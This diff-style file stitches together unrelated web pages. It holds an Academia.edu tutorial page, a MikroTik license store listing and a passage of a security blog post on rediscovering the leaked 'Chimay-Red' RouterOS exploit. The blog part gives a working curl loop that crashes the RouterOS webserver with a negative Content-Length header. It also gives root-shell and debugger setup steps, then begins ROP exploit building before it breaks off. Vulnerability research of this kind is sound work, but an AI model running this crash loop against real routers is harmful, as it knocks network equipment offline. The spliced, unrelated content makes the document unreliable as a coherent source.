@@ -1,0 +1,2353 @@
+220 MikroTik FTP Server (MikroTik 5.6 ready)(PDF) How to setup Mini ISP using Mikrotik | wahyu
+prayogo - Academia.edu
+Skip to main content
+You're using an out-of-date version of Internet Explorer.To browse Academia.edu and the wider internet faster and more securely, please take a few seconds to upgrade your browser.
+Log InSign UpLog InSign Upmore&nbspJob BoardAboutPressBlogPeoplePapersTermsPrivacyCopyright We're Hiring! Help Centerless&nbsp
+pdfHow to setup Mini ISP using MikrotikWahyu PrayogoDownload with GoogleDownload with Facebookor download with emailHow to setup Mini ISP using MikrotikDownloadHow to setup Mini ISP using MikrotikWahyu PrayogoLoading PreviewSorry, preview is currently unavailable. You can download the paper by clicking the button above.Related PapersTutorial Mikrotik KompletBy Ardian DharmaMODUL PELATIHAN NETWORKBy Oom BangTutorial-mirotikBy Muhammad SofiyudinMODUL PELATIHAN NETWORK MIKROTIKBy Achmad Raizalditutorial mikrotikBy Xant AiraREAD PAPERDownload pdf
+×CloseLog InLog In with FacebookLog In with GoogleorEmail:Password:Remember me on this computeror reset passwordEnter the email address you signed up with and we'll email you a reset link.
+Need an account? Click here to sign up
+AboutPressBlogPeoplePapersJob BoardAdvertise We're Hiring! Help CenterFind new research papers in:PhysicsChemistryBiologyHealth SciencesEcologyEarth SciencesCognitive ScienceMathematicsComputer ScienceTermsPrivacyCopyrightAcademia ©2019MikroTik RouterOS Level 5 License
+JavaScript seems to be disabled in your browser.
+You must have JavaScript enabled in your browser to utilize the functionality of this website.
+Cart
+Checkout
+Login
+Welcome, please log in here
+Baltic Networks Logo
+(888) 929-3610 Affordable Wireless Solutions
+0 products in cart.
+Cart
+Checkout
+You have no items in your shopping cart.
+Catalog
+Search
+Search:
+Catalog
+Home
+Manufacturers.
+Alpha Wireless
+American Tower.
+Free Standing
+Self Supporting.
+Standard Self Supporting
+1810 Self Supporting
+Heavy Duty Self Supporting
+Aranet
+MikroTik.
+New MikroTik Products
+Antennas
+CloudCore Routers
+Enclosures & Cases
+Ethernet Routers
+Power Supplies
+RouterBOARD
+RouterOS License
+Switches
+Wireless Cards
+Wireless for Home and Office (SOHO)
+Wireless Solutions for WISPs
+MikroTik Accessories
+Clearance
+LTE
+Maxxwave.
+New Maxxwave Products
+Antennas and Antenna Accessories
+Enclosures and Rackmount Adapters
+Fiber Modules and Fiber Patch Cables
+Pigtails and Patch Cables
+Power Supplies and PoE Injectors
+RouterMaxx Routers
+UBTik
+Maxxwave Accessories
+Ubiquiti.
+New Ubiquiti Products
+airFiber.
+Radios
+Antennas
+Accessories
+airMAX.
+Antennas.
+airMAX AC Sector Antenna
+airPrism Sector Antenna
+RocketDish Antenna
+RocketDish AC Antenna
+RocketDish LW
+airMAX Sector Antenna
+airMAX Omni Antenna
+airMAX Yagi Antenna
+IsoBeam
+Horn 5 Antenna
+CPE.
+NanoBeam AC
+LiteBeam AC
+NanoStation AC
+PowerBeam AC
+IsoStation AC
+PowerBeam AC ISO
+AP.
+Rocket AC
+LiteBeam AC AP
+Rocket Prism AC
+PrismStation AC
+Accessories
+Legacy.
+IsoStation M
+LiteBeam M5
+NanoBeam M
+NanoBridge M
+NanoStation M
+PowerBridge M
+PowerBeam
+PowerBeam M5 ISO
+Rocket M
+EdgeMax.
+Routing.
+EdgeRouter
+EdgePoint
+EdgeRouter X
+EdgeRouter X SFP
+EdgeRouter Lite
+EdgeRouter PoE
+EdgeRouter PRO
+EdgeRouter Infinity
+EdgeRouter 4
+Switching.
+EtherMagic
+ToughSwitch
+EdgeSwitch
+EdgeSwitch 8-150w
+EdgeSwitch Lite
+EdgeSwitch 12F
+EdgeSwitch 16XG
+Accessories
+U Fiber.
+CPE.
+UFiber Nano G
+UFiber OLT
+Accessories.
+Fiber Modules & Cable
+GPON OLT SFP Transceiver
+PowerModule
+TOUGHCable
+UniFi.
+LED Panel
+Wireless.
+UniFi AP AC LITE
+UniFi AP AC LR
+Routing and Switching
+Accessories
+Legacy
+UniFi Video.
+Accessories
+Cameras
+Accessories for Ubiquiti Products.
+Cable and Connectors
+Wireless Cards
+Power Supplies
+mFi
+Clearance
+Baicells.
+Basestations
+CPEs
+Accessories
+LTE Starter Kits
+BEC Technologies
+Cambium Networks.
+New Cambium Products
+ePMP 1000.
+Antennas
+Radios
+ePMP 2000
+ePMP 3000
+ePMP Force.
+Antennas
+PMP450.
+Access Points
+Antennas
+License Keys
+Subscriber Modules
+PTP450
+PTP 550
+PTP650.
+License Keys
+Integrated Radio
+PTP820.
+Radios
+PtP Kits
+Extended Warranty
+Activation Key
+cnMatrix
+cnPilot
+cnRanger
+cnReach
+Cambium Accessories
+Cisco Meraki.
+Access Points
+Antennas
+Power Management
+Licenses
+CyberData
+DASAN Zhone Solutions.
+Whole Home WiFi
+Optical Network Terminal (ONT)
+Optical Line Terminal (OLT)
+Network Management
+Accessories
+CPE
+Digital Loggers
+EnGenius.
+Controllers & Switches
+Gateways/Routers
+Indoor Access Points/Bridges
+Outdoor Access Points/Bridges
+Phone Systems
+PoE
+USB Adapters
+Wireless Extenders
+Gamma Electronics
+Grandstream Networks .
+Analog Telephone Adapters
+Analog VOIP Gateways
+DECT Cordless IP Phones
+High-End IP Phones
+IP Multimedia Phones
+IP Video Surveillance
+IP PBX Appliances
+Small Business / Home Office IP Phones
+Routing + Wireless
+HotLava Systems
+iDEATRONIK
+IgniteNet.
+Outdoor Wireless
+Indoor Wireless
+Network Switches
+Antennas
+Accessories
+INNO Instrument.
+Cable Antenna Analyzer
+Cleavers
+Fusion Splicers
+OTDR
+Strippers
+Accessories.
+Splice-on Connectors.
+Single-Mode.
+UPC
+APC
+Multi-Mode
+ILSintech.
+Cleavers
+Fusion Splicers
+Preparation Tools
+Accessories
+Connectivity
+ITElite.
+500 MHz Antennas
+700 MHz Antennas
+900 MHz Antennas
+2.4 GHz Antennas
+3.5 GHz Antennas
+5 GHz Antennas
+3x3 MiMO Antennas
+Enclosures
+MiMO Antennas
+Multi-Band Antennas
+Jirous.
+5GHz
+11GHz
+Accessories
+Laird Technologies
+LigoWave.
+2.4 GHz
+3 GHz
+4.9 GHz
+5 GHz
+Microwave
+Antennas
+Accessories
+Mimosa.
+New Mimosa Products
+Access Points
+Backhaul
+CPE
+Point to Multi-Point
+Accessories
+MTI Wireless Edge.
+5GHz Antennas
+900MHz Antennas
+Antenna Accessories
+Parabolic/Grid Antennas
+MorningStar
+Netonix.
+Switches
+Accessories
+Peplink/Pepwave.
+Content Caching Routers
+Enterprise Multi-WAN Routers
+Wi-Fi Access Points
+SOHO Multi-WAN Routers
+Mobile Wi-Fi Routers
+Wi-Fi Client Bridges
+Accessories
+Licensing / Warranties
+Switch
+Polycom
+Primus Cable.
+Cat5 Cable
+Cat6 and Cat7 Cable
+Cat5/Cat6 Connectors
+Fiber.
+Fiber Cable
+Fiber Optic Connectors
+Fiber Pigtails
+Buffer Tubing
+Splice Trays
+Splice Enclosures
+Patch Panels
+Tools
+Patch Panels / Mounting Hardware
+Accessories
+ReadyNet
+RF Elements
+RFS
+SAF.
+Antennas
+CFIP Lumina
+FreeMile
+Integra
+Accessories for SAF
+PhoeniX
+Services
+Shireen
+Siklu.
+EtherHaul 500 Series
+EtherHaul 600 Series
+EtherHaul 1200 Series
+EtherHaul 2200 Series
+EtherHaul 2500 Series
+EtherHaul 5500 Series
+EtherHaul 8000 Series
+MultiHaul Series
+Mounting Kits
+Tenda.
+Access Controller
+Access Points
+CPE
+PON
+Range Extender
+Routers
+Switches
+TP-Link.
+Wireless Access Point
+Wireless Routers
+Ethernet Routers
+Switches
+Antennas
+PoE Splitter/Injectors
+Fiber Modules
+Accessories
+Tycon Systems.
+New Tycon Systems Products
+Tycon Power.
+DC to DC Converters / PoE Inserter
+PoE.
+PoE Active Splitters
+PoE Injectors
+PoE Injector (Mid-span Multi-port)
+PoE Passive Splitters / Injectors
+PoE Switches
+Power Supplies
+Surge Protectors
+Voltage Converters
+Tycon Solar.
+Battery Chargers
+Batteries / Power Bank
+Enclosures
+Remote Power Monitor
+Solar / Wind.
+Solar Kits
+Solar Panels
+Solar Panel Accessories
+Wind Turbines
+UPS Systems.
+RemotePro - Remote Power Systems
+UPSPRO-Solar Ready UPS Systems
+UPSPRO-UPS Systems 120/240VAC
+UPSPRO-UPS Systems for MikroTik and Ubiquiti
+Tycon Wireless.
+Miscellaneous Tycon Wireless
+Weather Stations
+Wireless Access Points
+Yealink.
+Yealink Accessories
+IP Phone
+IP DECT Phone
+IP Video Phone
+Yeastar.
+VoIP Gateways
+IP Phone Systems
+N Series Telephone Systems
+Expansions and Modules
+ZTE
+Complete Solutions.
+MikroTik Solutions.
+MikroTik Complete
+Made for MikroTik
+Powered by MikroTik
+Point to Point.
+2.4Ghz
+4.9Ghz (Public Safety)
+5.8GHz
+3Ghz Range
+11Ghz
+18Ghz
+20-25Ghz Range
+60GHz
+55-90Ghz Range
+Point to Multi Point.
+900Mhz
+2.4Ghz
+5.8GHz
+3Ghz (Licensed)
+60-70Ghz
+3G / 4G Solutions.
+Failover and POS Solutions
+M2M Digital Signage & Kiosks
+802.11AC
+802.11AX
+Access Points / Bridges / Base Stations.
+Base Stations
+Bridges
+Enterprise Wi-Fi
+Indoor Access Points
+Outdoor Access Points
+Wireless for Home and Office (SOHO)
+CPE
+Ethernet Routers
+FCC Licensed Radios.
+220MHz
+6Ghz
+10/11Ghz
+18Ghz
+23Ghz
+24Ghz
+70 - 90GHz
+Fiber Routers / Fiber Modules
+Gigabit Routers/Switches
+Hotspot
+Machine to Machine
+Security & Surveillance.
+Data Logging Wind/Weather Stations
+Intercom Systems
+IP Cameras
+Video Recorders
+Switches
+Telephony.
+VOIP Accessories
+Intercoms & Speakers
+PBX Solutions
+Phones
+VoIP Adapters
+VoIP Gateways
+Wireless Routers
+Network Components.
+Promotions.
+Baicells Promotions
+Baltic Swag
+Cambium Promotions
+Gigabit Wireless Headquarters
+Golden MikroTik
+IgniteNet Promotions
+Mimosa Promotions
+Siklu Promotions
+Summer Sale
+Antennas.
+400MHz Range Antennas
+900MHz Range Antennas
+2GHz Range Antennas
+3GHz Range Antennas
+4.9GHz Range Antennas
+5GHz Range Antennas
+10/11GHz Range Antennas
+18GHz Range Antennas
+60GHz and Above Antennas
+Antenna Accessories
+Cellular Antennas
+Dual Polarization Antennas
+Integrated Panel/Enclosure for MikroTik
+Omni-directional
+Parabolic Grid/Dish
+Sector Antennas
+Vehicle Antennas
+Embedded Single Board Computer
+Enclosures & Cases
+Ethernet Cable, Connectors, Tools.
+Ethernet Cable
+Connectors
+Tools
+Fiber.
+Fiber Optic Cable
+Splicers / Cleavers / Strippers
+Sleeves
+Adapters
+Distribution/Terminal Boxes/Splice Enclosures
+Fiber Termination Tool Kit
+PON
+Modules
+Patch Cables
+Fiber Accessories
+Pigtails
+Splitter
+Splice Trays
+Patch Panels
+Splice On Connectors
+IoT
+LTE
+Mounting Hardware.
+Wall Mounts
+Pole Mounts
+Rack Mounts
+Roof Mounts
+Rail Mount
+Network Cards.
+Ethernet Adapters.
+1 Gigabit
+10 Gigabit
+40 Gigabit
+Wireless Cards
+Pigtails & Cable Assemblies
+Power Management.
+Battery Chargers
+Batteries/Power Bank
+Charge/Lighting Controller
+DC to DC Converters/POE Inserters
+Midspan Multiport Power Injectors
+Outdoor UPS Backup Power Systems.
+Solar Ready - POE Powered
+120/240VAC
+Made for MikroTik and Ubiquiti
+PoE Switches
+PoE Active Splitters
+PoE Passive Splitters / Injectors
+Power Injectors
+Power Supplies
+Solar Panels
+Solar Kits
+Solar Remote Power Systems
+Surge Protectors.
+Ethernet
+RF Surge Protectors
+Voltage Converters (non POE)
+Power Cable
+Software Licenses and Branding
+Network Component Accessories
+Accessories for Ubiquiti
+Clearance
+Made For.
+Baicells
+MikroTik
+Cambium
+Mimosa
+Resources.
+Apply for Credit Terms
+FCC Coordination
+Services
+Training
+Webinars
+Consulting
+Technical Support
+Events
+Pre-Configuration
+Custom Branding
+Wireless Calculators
+Equipment Leasing
+Licensed PtP Quote Request
+Home
+/
+MikroTik RouterOS Level 5 License
+SWL5 - MikroTik RouterOS Level 5 License
+Email to a Friend
+Availability:
+In stock
+Regular Price:
+$95.00
+Special Price:
+$70.00
+Learn more
+Learn more
+MikroTik WISP Level 5 License.
+Click here for license details
+NOTICE:
+You must create an account when checking out.
+Your contact information will be verified and used to send you your license by email so be sure that it is correct. Once verified, your license will be issued within 2 business hours.
+There are no refunds for software license keys.
+NOTICE: This product is available only to the residents of US, Canada and UK.
+Orders by residents of all other countries cannot be fulfilled and when placed, will be cancelled.
+You must select the Device Type you are using in the pull down menu below and enter the Software ID from your router.
+On the command console enter:
+/system license print
+Capture the software ID and enter it below.
+Click here for license details
+RouterOS User Manuals and Technical DocumentationMikroTik Technical Support InformationWhat is RouterOS?RouterOS ManualRouterOS Features
+Not all features may be available due to product hardware configuration.
+The device comes with RouterOS - the operating system, which will turn this powerful system into a highly sophisticated router, firewall or bandwidth manager. RouterOS is a stand-alone operating system based on the Linux v3.3.5 kernel. You can try RouterOS today, go to MikroTik Website for a free-trial demo. The free trial provides all of the features with no limitations. Major features include:
+Firewall:
+Statefull filtering Source and destination NAT NAT helpers (h323, pptp, quake3, sip, ftp, irc, tftp) Internal connection, routing and packet marks Filtering by IP address and address range, port and port range, IP protocol, DSCP and many more Address lists Custom Layer7 matcher IPv6 support PCC - per connection classifier, used in load balancing configurations
+Routing:
+Static routing Virtual Routing and Forwarding (VRF) Policy based routing Interface routing ECMP routing IPv4 dynamic routing protocols: RIP v1/v2, OSPFv2, BGP v4 IPv6 dynamic routing protocols: RIPng, OSPFv3, BGP Bi-directional Forwarding Detection ( BFD)
+MPLS:
+Static Label bindings for IPv4 Label Distribution protocol for IPv4 RSVP Traffic Engineering tunnels VPLS MP-BGP based autodiscovery and signaling MP-BGP based MPLS IP VPN complete list of MPLS features
+VPN:
+Ipsec – tunnel and transport mode, certificate or PSK, AH and ESP security protocols. Hardware encryption support on RouterBOARD 1000. Point to point tunneling (OpenVPN, PPTP, PPPoE, L2TP, SSTP) Advanced PPP features (MLPPP, BCP) Simple tunnels ( IPIP, EoIP) IPv4 andIPv6 support 6 to 4 tunnel support (IPv6 over IPv4 network) VLAN – IEEE802.1q Virtual LAN support, Q-in-Q support MPLS based VPNs
+Wireless:
+IEEE802.11a/b/g wireless client and access point Full IEEE802.11n support Nstreme and Nstreme2 proprietary protocols NV2 protocol Wireless Distribution System (WDS) Virtual AP WEP, WPA, WPA2 Access control list Wireless client roaming WMM HWMP+ Wireless MESH protocol MME wireless routing protocol
+DHCP:
+Per interface DHCP server DHCP client and relay Static and dynamic DHCP leases RADIUS support Custom DHCP options DHCPv6 Prefix Delegation (DHCPv6-PD) DHCPv6 Client Hotspot Plug-n-Play access to the Network Authentication of local Network Clients Users Accounting RADIUS support for Authentication and Accounting
+QoS:
+Hierarchical Token Bucket ( HTB) QoS system with CIR, MIR, burst and priority support Simple and fast solution for basic QoS implementation - Simple queues Dynamic client rate equalization ( PCQ)
+Proxy:
+HTTP caching proxy server Transparent HTTP proxy SOCKS protocol support DNS static entries Support for caching on a separate drive Parent proxy support Access control list Caching list
+Tools:
+Ping, traceroute Bandwidth test, ping flood Packet sniffer, torch Telnet, ssh E-mail and SMS send tools Automated script execution tools CALEA File Fetch tool Advanced traffic generator
+Other features:
+Samba support OpenFlow support Bridging – spanning tree protocol (STP, RSTP), bridge firewall and MAC natting. Dynamic DNS update tool NTP client/server and synchronization with GPS system VRRP v2 and v3 support SNMP M3P - MikroTik Packet packer protocol for wireless links and ethernet MNDP - MikroTik neighbor discovery protocol, supports CDP (Cisco discovery protocol) RADIUS authentication and accounting TFTP server Synchronous interface support (Farsync cards only) (Removed in v5.x) Asynchronous – serial PPP dial-in/dial-out, dial on demand ISDN – dial-in/dial-out, 128K bundle support, Cisco HDLC, x75i, x75ui, x75bui line protocols, dial on demand
+2018 MikroTik Product Catalog
+*Device Type
+-- Please Select --RouterBOARD X86 System
+*Software ID (XXXX-XXXX):
+Maximum number of characters: 9
+* Required Fields
+Regular Price:
+$95.00
+Special Price:
+$70.00
+Qty:
+Add to Cart
+Available Services For This Product
+Related Products
+Check items to add to the cart or
+select all
+Additional Information
+Part Number
+MikroTik WISP Level 5 License
+SKU
+SWL5
+Manufacturer
+MikroTik
+HTS Code
+No
+ECCN
+No
+UPC
+No
+x
+Add to Cart
+Price:
+Actual Price:
+Our price is lower than the manufacturer's "minimum advertised price."
+As a result, we cannot show you the price in catalog or the product page.
+You have no obligation to purchase the product once you know the price. You can simply remove the item from your cart.
+Our price is lower than the manufacturer's "minimum advertised price."
+As a result, we cannot show you the price in catalog or the product page.
+You have no obligation to purchase the product once you know the price. You can simply remove the item from your cart.
+Newsletter
+Newsletter Signup
+Facebook
+Twitter
+About Us
+Contact Us
+Our Company
+Careers
+Sitemap
+Service & Support
+Shipping Information
+Order Pickup
+RMA & Warranty
+Terms Of Service
+Safe & Secure Shopping
+Privacy Policy
+Terms & Conditions
+Baltic Networks
+2200 Ogden Ave. - Suite 240
+Lisle, IL 60532 USA
+630-929-3610
+(c). 2019 Baltic Networks, Inc.
+Site Map
+Search Terms
+Advanced Search
+Orders and Returns
+Contact Us
+Request RMA
+Remove This Item
+Continue shopping
+Back to topChimay-Red
+Seekintoo: blog
+seekintoo.com
+arcsight
+careers
+ctf
+research
+Chimay-Red
+Sat 28 April 2018
+By
+Dayton
+This post outlines and presents the rediscovery, vulnerability analysis and exploitation of a zero-day vulnerability that was
+originally discovered and exploited by the CIA's "Engineering Development Group"; remotely targeting MikroTik's RouterOS
+embedded operating system that was discovered during the "Vault 7" leak via WikiLeaks in March of 2017.
+Brief History and Background
+MikroTik (MK) is a Latvian company founded in 1996 and is known for its routers, switches and wireless network equipment.
+MikroTik is primarily famous for its embedded routing OS/hardware ecosystem: RouterOS and RouterBOARD.
+RouterOS is a uClibC Linux 3.3.5 based embedded OS with a proprietary software based routing suite and tool set written in C++ called "NOVA", and is MK's OS for nearly all of their hardware routing - switching products.
+RouterOS was originally designed for running on the RouterBOARD line of products, but as of the last few years, MK has opened the ability to run RouterOS on any almost any x86 hypervisor, baremetal x86 and more recently a AWS cloud offering.
+What really makes RouterOS and RouterBOARD an attractive option for many is its price point versus the competition with comparable performance and often extra features. A Cisco switch supporting MPLS will run you a few thousand dollars, while the competing MK offering with MPLS is 4x cheaper on average. Although managing an advanced configuration of RouterOS can be a bit of a curve if you are not familiar with systems like Cisco's IOS
+Note: The NOVA suite will not run outside of RouterOS (Eg. docker container) without serious hacks, which I will show in a later post. Having done this has opened up an easier method for exploit fuzzing and testing across many architectures and versions using QEMU or other instrumentable architecture virtualization.
+RouterBOARD 850gx3
+Plausible causes of interest (speculation)
+Why might the CIA be interested in exploiting these devices? Well for starters at any given time, between 1,500,000 and 2,000,000 MK RouterOS devices are exposed on the public net, as seen via shodan.io. These figures are on par with Cisco's exposure numbers and typically three times more exposed than D-Link and other usual suspects.
+Censys additionally reports that around 50,000 RouterOS devices currently have the HTTP management interface exposed to the public net. Top RouterOS device host countries include (in-order): Brazil, China, Indonesia and Russia.
+shodan.io device map: 1 == 1000 devices
+In combination with MK's current deployed scale globally and population in known targeted countries it seems reasonable that MK would be a prime candidate for such exploit development by a nation state. Similarly, found within the leaks is documentation for an exploit kit that compromises the AVTech Network Video Recorder code-named "Mealybug". As of posting this article, AVTech devices are the second most popular shodan search term, with around 130,000 results worldwide; Further re-enforcing the idea that the CIA has interest in developing exploits for very popular consumer hardware.
+Kaspersky also shows claims that tooling to exploit MK has been around "for a long time", as seen in the "Slingshot" APT report FAQ published this year.
+Vault 7
+Vault 7 aka. "Year Zero" was a mega-dump of approximately 23 projects and other various artifacts on Tuesday March 7th, 2017 from the CIA's Engineering Development Group (EDG) division at the Center for Cyber Intelligence (CCI)), a special development branch belonging to the CIA's Directorate for Digital Innovation (DDI) in Langley, Virginia.
+Comprising 8,761 documents and files, the leaks detailed abilities to compromise cars, smart TVs, browsers, phones and operating systems. Most, if not all, leaked projects were developed to preform electronic surveillance and/or cyber-warfare. Although no vulnerability sources or binaries were released, the leaked documentation has given attackers significant direction in rediscovering many of the same exploits.
+The Engineering Development Group is responsible for building certain notable tools as discovered in the leaks, such as: Hive, Cutthroat, Chimay-Red, Dark Matter, and Sonic Screwdriver. These tools were distributed to operators and partners when conducting proxy cyber-activities in regions where the US may face legal issues the partner state does not have as stringent laws against.
+Chimay-Red
+Background
+Chimay-Red is a zero-day exploit for the HTTP management/configuration/proxy webserver called www in MK RouterOS versions 6.x, originally targeting MIPS, MIPSEL, PPC, and x86 architectures. The exploit abuses a multithreaded remote stack collision vulnerability due to an implementation error with the usage of the compiler built-in alloca() by "allocating" a untrusted remotely supplied size value during a content-length header check. It is believed that Chimay-Red was originally used to implant HIVE or TinyShell onto the target system, as noted in the "hive-UsersGuide.pdf" document under: "7.1 (S) Installing Hive on MikroTik MIPS RouterOS 6.x using Chimay-Red".
+Documentation and version release notes suggest that development of the exploit was completed around 07/2015 (pg. 29 hive-UsersGuide.pdf):
+V2.9 (07/01/2015)
+• Adds a user-defined directory path for the .config and .log files to avoid read-only memory.
+• Adds support for MikroTik 6.x.
+Also found within hive-UsersGuide.pdf pg. 23 and image2015-4-27%2010:46:48.png is usage and other interesting information about Chimay-Red's inner workings:
+Exploit Usage:
+Operator usage Python traceback screenshot:
+Notice the hierarchy of the traceback from the Python interpreter. Arguments are passed into the entrypoint, which chooses the exploit module within ChimayRed_v3.7/bin/libs/<arch>/Exploit.py based off of detected or selected architecture and throws the payload in the given module to the given host and port.
+The throw_v6() (exploit version 6.x) function seems to use multiple sockets and predetermined or at least stored content-length and content values to some HTTP POST-able endpoint, which is a interesting hint towards where we might find this bug in the webserver binary.
+Unfortunately, due to the lack of information available within the leaks pertaining the Chimay-Red exploit, I was not unable to recover any more useful background or hints. However, I was confident that I had learned enough to tackle exploiting the vulnerability myself.
+Chimay-Red (my turn)
+Up to the challenge to try and see if I could match what these vulnerability researchers had accomplished in secret and more, I was excited to get started hunting. I had a couple other things going for me as well at the time, some MK MIPS based devices on-hand, the Python traceback screenshot and manuals from the leaks and a patched version of RouterOS released by MK fixing the said vulnerability:
+MK 6.38.5 release notes - link
+Initial Goals
+I didn't just want to replicate the exploit exactly, I wanted to make it even better. So I created a set of requirements for myself of what I think my version of the exploit should accomplish.
+The replica exploit will:
+At minimum, conform to the operators usage guide.
+Support the same architectures and commands.
+Note: Specific supported 6.x versions are unknown via the leaks.
+The replica exploit should:
+Support all 6.x versions and architectures
+Tooling for enumerating, downloading, analyzing and cataloging system firmware
+Needed for building ROP-chains and store metadata for approx ~200 different FW versions
+Containerize and optionally emulate any system firmware for fuzzing and testing.
+On The Hunt
+Extracting FW images:
+Binwalk can help us make quick work of identifying magic bytes within the firmware files in-order to extract the root SquashFS filesystem.
+$ binwalk -e ./routeros-<architecture>-<version>.npk ./routeros-<architecture>-<version>.npk
+4096
+0x1000
+Squashfs filesystem, little endian, version 4.0, compression:xz, size: 7109576 bytes, 1034 inodes, blocksize: 262144 bytes, created: 2016-10-05 12:07:28
+Webserver Binary Location:
+$ find $firmware-images.extracted/squashfs-root -name "www" -type f
+firmware-images.extracted/squashfs-root/nova/bin/www
+$ file $firmware-images.extracted/squashfs-root/nova/bin/www
+www: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+WWW Reverse Engineering Notes
+Full reverse engineering analysis of the www webserver binary is outside the scope of this post. Although I will provide some important notes:
+One thread per socket connection.
+Each connection is allocated 128KiB (0x20000) of stack space per thread
+This is set by pthread_attr_setstacksize in main()
+Each thread stack space is allocated ontop on the previous thread.
+|
+|
+^-------------^ < Thread2 ESP
+|
+|
+|
+|
+|
+Thread1
+|
+|
+|
+^-------------^ < Thread1 ESP
+|
+|
+|
+|
+|
+Thread0
+|
+|
+|
+^-------------^ < Thread0 ESP
+Automatically restarted on crash after three seconds
+The loader arbiter (/nova/bin/loader) controls this via signal handling and PID tracking.
+ELF Mitigations:
+Architecture
+NX
+CANARY
+PIE
+RELRO
+x86
+YES
+NO
+NO
+NO
+ARM
+YES
+NO
+NO
+NO
+POWERPC
+YES
+NO
+NO
+NO
+SMIPS
+NO
+NO
+NO
+NO
+MMIPS
+NO
+NO
+NO
+NO
+MIPSBE
+NO
+NO
+NO
+NO
+TILE
+NO
+NO
+NO
+NO
+Analyzing the difference with IDA and BinDiff
+By looking at the difference in the assembled sections of the binary of the known vulnerable version and the known fixed version gave a clear look into what exactly has been patched to fix the vulnerability.
+Note: A good BinDiff trick is to look for lowest similarity with high confidence
+6.38.4 versus 6.38.5 BinDiff subroutine similarity chart
+It appears Request::readPostData(int32_t arg1, int32_t arg2) would be a prime candidate to diff due it being the function with the highest confidence rating of a altered subroutine at a score of "0.82".
+Left: 6.38.4 (x86) | Right: 6.38.5 (x86)
+I could not get IDA to produce psuedocode for the subroutine, so instead I have hand written it below (correct me if wrong, please):
+int header;
+int recv_len;
+int *alloca_sp
+int content_length_value = 0;
+char *content_length;
+// Block until request received
+recv_len = sock::recv(32768);
+// Set the name of the header we are looking for
+string::string(&content_length, "content_length");
+// Grab given header_name given the raw request.
+header = Headers::getHeader(&content_length, &content_length_value);
+if (!header) {
+goto exit;
+} else if (recv_len == 0) {
+goto exit;
+} else if (recv_len < content_length_value) {
+goto exit;
+}
+// Stack colision vulnerability due to insufficient content_length_value filtering as seen above.
+// This call is optimized to "sub eax, esp" with most compilers.
+alloca_sp = alloca(content_length_value);
+// Read content_length_value bytes from socket and write
+// into newly likely improperly allocated stack space. (SIGSEGV)
+istream::read(alloca_sp, content_length_value)
+So what's the vulnerability?
+Since no filtering/conditionals are happening to ensure that the content-length_value does not exceed the thread stack page size limits, the vulnerability could be triggered by passing a negative number into the content-length header. This results in a alloca() *size argument far exceeding the size of the current connection thread stack frame size of 128KiB during a logical AND of the size value to enforce stack alignment.
+alloca() in-lined assembly snippet from readPostData():
+8055a56:
+8d 42 10
+lea
+eax,[edx+0x10] << load effectively content_length_value from edx+0x10 into eax
+8055a59:
+83 e0 f0
+and
+eax,0xfffffff0 << AND content_length_value to enforce stack alignment at mutliples of 16 bytes
+8055a5c:
+29 c4
+sub
+esp,eax
+<< "allocate" space by subtracting the stack pointer (esp) by content_legth_value
+Example alloca() alignment in Python:
+>>> content_length_value = -1
+>>> (content_length_value - 0x10) & 0xFFFFFFF0
+4294967264
+As you can see in the example alignment calculation, due to the logical AND preformed on the content_length_value to enforce the stacksize to be in alignment with STACK_ALIGN (16 bytes on most architectures), an integer overflow has occurred. This will cause alloca() to attempt to subtract the stack pointer by a massive amount, exhausting additional thread stack space causing the webserver to SIGSEGV when that unallocated memory is improperly accessed during the next threaded connection or by other arbitrary access.
+The patched version ensures no such overlaps can occur by first validating the content_length_value and resizing before reaching alloca().
+Identifying a POST method URL endpoint on the webserver:
+To discover a URL endpoint on the webserver that I could actually POST arbitrary data into, I fired up WireShark and browsed to the login page of the management server and logged in. This shows a POST endpoint available in the working directory called /jsproxy:
+PoC ()
+At this point we should have a proof of concept that we can use to test if the target webserver crashes. Simply passing a negative one into the content_length header should be enough
+to wrap the integer and overallocate to crash the server. To test, we can craft this header with CURL in a POST request and spam the webserver with it in a loop :).
+CURL PoC:
+while ; do curl -X POST -H "Content-Length: -1" -d '{"foo":"bar"}' http://<target>:80/jsproxy && sleep 0.5; done
+ASCIInema PoC demo:
+As you can see, the webserver crashes and is automatically restarted every three seconds.
+Building the Exploit
+For a test target, I just installed RouterOS within VirtualBox and bound the first interface to a host-only adapter. I won't be covering this in particular, in-depth instructions can be found on Google.
+Most of the tools I used in this section and recommend others to use for embedded Linux exploit development/research:
+pwntools
+MIPSROP
+GDB
+GDB PEDA
+GEF
+Binutils Collection
+Getting a debugger on the target
+I'm going to need a debugger on my target in-order to further understand and analyze the crash before going any further.
+This is a fairly simple and straightforward process thanks to MK enabling something called devel-login, which will allow us to gain a root shell.
+Mount both partitions from RouterOS Virtual Disk
+$ mount /dev/sda1 /mnt/disk1
+$ mount /dev/sda2 /mnt/disk2
+Create a file called devel-login in /dev/disk2/etc/
+$ touch /dev/disk2/etc/devel-login
+Copy uClibC compiled gdbserver to /mnt/disk1/flash/bin
+$ cp ./gdbserver /mnt/disk/flash/bin
+Connect over telnet to target and login as devel-login, blank password:
+MikroTik 6.38.4 (stable)
+MikroTik Login: devel-login
+Password:
+BusyBox v1.00 (2017.03.02-08:29+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+#
+Run the gdbserver previously copied into /flash/bin/gdbserver.i686:
+$ /flash/bin/gdbserver 0.0.0.0:4444 --attach $(pidof www)
+You can now do remote debugging with GDB:
+$ gdb -q
+gdb-peda$ target remote 192.168.56.124:4444
+Exploit Building Preconditions and Requirements
+To avoid NX (non-executable) memory protections and ASLR (Address-Space-Layout-Randomization) on (x86, ARM, POWERPC), typical return-oriented techniques can be employed to reuse existing executable memory once execution flow via the IP (Instruction Pointer) is controlled. Therefore on systems without NX applied (MIPS* and TILE); NX does not need to be bypassed and has the ability to execute code on the stack. For my purposes I will be using a ROP (Return-Oriented-Programming) chain every time for every architecture regardless.
+Why? Because why not? ROP chains work on both systems with and without NX protections, can't hurt ¯_(ツ)_/¯.
+But what this still means is the attacker (me) must have the target version of webserver (www) present to gather instruction offsets for ROP. This is where MikroDB comes in as you will see shortly in the post.
+Detecting architecture remotely
+Architecture is discovered remotely via a protocol called MNDP (MikroTik Neighbor Discovery Protocol).
+MNDP
+The MikroTik Neighbor Discovery Protocol (MNDP) eases network configuration and management
+by enabling each MikroTik router to discover other connected MikroTik routers and learn
+information about the system along with features which are enabled. The MikroTik routers
